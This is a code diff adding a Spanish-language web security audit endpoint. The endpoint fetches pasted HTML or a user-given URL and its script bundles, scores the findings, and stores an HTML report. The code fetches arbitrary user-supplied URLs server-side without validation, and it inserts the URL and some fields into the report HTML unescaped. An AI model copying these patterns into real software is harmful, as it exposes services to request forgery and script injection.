+      add({ id: "header-xframe", category: "🌐 Headers HTTP", type: "Sin X-Frame-Options", severity: "medium", cvss: 5.4, title: "Vulnerable a Clickjacking", description: "Sin X-Frame-Options ni CSP frame-ancestors, la página puede embeberse en iframes maliciosos.", evidence: "X-Frame-Options no encontrado", attackScenario: "Clickjacking: el atacante crea una página con tu sitio embebido en un iframe invisible sobre un botón trampa. El usuario cree hacer click en algo inocente pero está ejecutando acciones en tu app (transferencias, cambio de email, etc.).", fix: "X-Frame-Options: DENY — o añadir frame-ancestors 'self' en tu CSP." });
+    }
+  }
+
+  // Ordenar por severidad
+  const order: Record<AuditSeverity, number> = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
+  return findings.sort((a, b) => (order[a.severity] ?? 5) - (order[b.severity] ?? 5));
+}
+
+router.post("/web-lab/security-audit", async (req: Request, res: Response): Promise<void> => {
+  try {
+    const { html, url, projectId } = req.body as { html?: string; url?: string; projectId?: number };
+
+    let content = html ?? "";
+
+    // Si no hay HTML pero hay URL, intentamos obtener el código fuente
+    if (!content.trim() && url) {
+      try {
+        const ctrl = new AbortController();
+        setTimeout(() => ctrl.abort(), 12000);
+        const r = await fetch(url, {
+          signal: ctrl.signal,
+          headers: { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" }
+        });
+        content = await r.text();
+        // Intentar también obtener el primer bundle JS
+        const scriptSrcs = [...content.matchAll(/<script[^>]+src=["']([^"']+\.js[^"']*)/gi)].map(m => m[1]).slice(0, 2);
+        for (const src of scriptSrcs) {
+          try {
+            const absUrl = src.startsWith("http") ? src : new URL(src, url).href;
+            const rjs = await fetch(absUrl, { signal: ctrl.signal });
+            const jsText = await rjs.text();
+            content += "\n" + jsText.slice(0, 300_000); // max 300KB de JS
+          } catch {}
+        }
+      } catch (e: any) {
+        if (!content.trim()) { res.status(400).json({ error: `No se pudo obtener el código de ${url}: ${e.message}. Pega el código manualmente.` }); return; }
+      }
+    }
+
+    if (!content.trim()) { res.status(400).json({ error: "Proporciona HTML, JS o URL para analizar" }); return; }
+    if (content.length > 8_000_000) content = content.slice(0, 8_000_000);
+
+    const findings = runFullSecurityAudit(content, url);
+
+    const stats = {
+      critical: findings.filter(f => f.severity === "critical").length,
+      high: findings.filter(f => f.severity === "high").length,
+      medium: findings.filter(f => f.severity === "medium").length,
+      low: findings.filter(f => f.severity === "low").length,
+      total: findings.length,
+    };
+
+    const categories = [...new Set(findings.map(f => f.category))];
+
+    const dbRisk = findings.some(f => f.dbImpact && f.severity === "critical") ? "critical"
+      : findings.some(f => f.dbImpact && f.severity === "high") ? "high"
+      : findings.some(f => f.dbImpact) ? "medium"
+      : "low";
+
+    const secScore = Math.max(0,
+      100
+      - stats.critical * 25
+      - stats.high * 12
+      - stats.medium * 5
+      - stats.low * 2
+    );
+
+    const scannedAt = new Date().toISOString();
+    const contentLength = content.length;
+
+    // ── Guardar en vault ──────────────────────────────────────────────────────
+    let vaultId: number | null = null;
+    const pid = projectId ? Number(projectId) : 0;
+    if (pid && !isNaN(pid) && stats.total > 0) {
+      try {
+        const reportHtml = `<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><title>Auditoría de Seguridad — Shopy Crafter</title>
+<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#0b0b0d;color:#e8e0d0;font-family:Inter,sans-serif;padding:40px 32px;font-size:14px}
+h1{color:#c4a55a;font-size:26px;margin-bottom:4px}p.sub{color:#9a9080;font-size:12px;margin-bottom:32px}
+.finding{background:#111;border-radius:12px;padding:16px;margin-bottom:14px;border-left:4px solid #555}
+.finding.critical{border-color:#ff4d4d}.finding.high{border-color:#ff9f40}.finding.medium{border-color:#ffd24d}
+.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;margin-right:6px}
+.badge.critical{background:#ff4d4d;color:#000}.badge.high{background:#ff9f40;color:#000}.badge.medium{background:#ffd24d;color:#000}
+.cat{color:#9a9080;font-size:11px;margin-bottom:4px}.title{font-weight:700;font-size:14px;margin-bottom:6px}
+.scenario{background:#1a1a2e;border-radius:6px;padding:10px;font-size:12px;color:#c4b5fd;margin:8px 0}
+.fix{background:#0d1a0d;border-radius:6px;padding:10px;font-size:12px;color:#4ade80;margin:8px 0}
+pre{background:#111;padding:10px;border-radius:6px;font-size:11px;overflow-x:auto;color:#86efac;margin-top:6px}
+</style></head><body>
+<h1>🔒 Auditoría de Seguridad Completa</h1>
+<p class="sub">${url || "Código pegado"} · ${new Date(scannedAt).toLocaleString("es-ES")} · Score: ${secScore}/100 · ${stats.total} hallazgos</p>
+${findings.map(f => `<div class="finding ${f.severity}">
+  <div class="cat">${f.category}</div>
+  <div class="title"><span class="badge ${f.severity}">${f.severity.toUpperCase()}</span>${escapeHtml(f.title)}${f.lineNumber ? ` <span style="color:#9a9080;font-size:11px">(línea ${f.lineNumber})</span>` : ""}</div>
+  <div style="font-size:12px;color:#aaa;margin-bottom:6px">${escapeHtml(f.description)}</div>
+  <div class="scenario">⚔️ Escenario de ataque: ${escapeHtml(f.attackScenario)}</div>
+  ${f.dbImpact ? `<div style="background:#1a0000;border-radius:6px;padding:10px;font-size:12px;color:#f87171;margin:8px 0">🗄️ ${escapeHtml(f.dbImpact)}</div>` : ""}
+  <div class="fix">💡 ${escapeHtml(f.fix)}</div>
+  ${f.fixCode ? `<pre>${escapeHtml(f.fixCode)}</pre>` : ""}
+</div>`).join("")}
+</body></html>`;
+        vaultId = await saveToVault({
+          projectId: pid,
+          fileType: "web-lab-report",
+          category: "web-lab",
+          title: `🔒 Auditoría Seguridad${url ? ` — ${new URL(url).hostname}` : ""}`,
+          description: `${stats.total} hallazgos (${stats.critical} críticos). Score: ${secScore}/100. DB risk: ${dbRisk}.`,
+          originalUrl: url,
+          mimeType: "text/html",
+          generatedBy: "web-lab-security-audit",
+          content: reportHtml,
+          metadata: { kind: "security-audit", scanUrl: url, score: secScore, dbRisk, scannedAt, stats },
+        });
+      } catch (e) { logger.warn({ e }, "security-audit vault save failed"); }
+    }
+
+    res.json({ success: true, findings, stats, categories, secScore, dbRisk, scannedAt, contentLength, vaultId });
+  } catch (err: any) {
+    logger.error({ err }, "Security audit failed");
+    res.status(500).json({ error: err.message || "Error en la auditoría de seguridad" });
+  }
+});
+
 export default router;
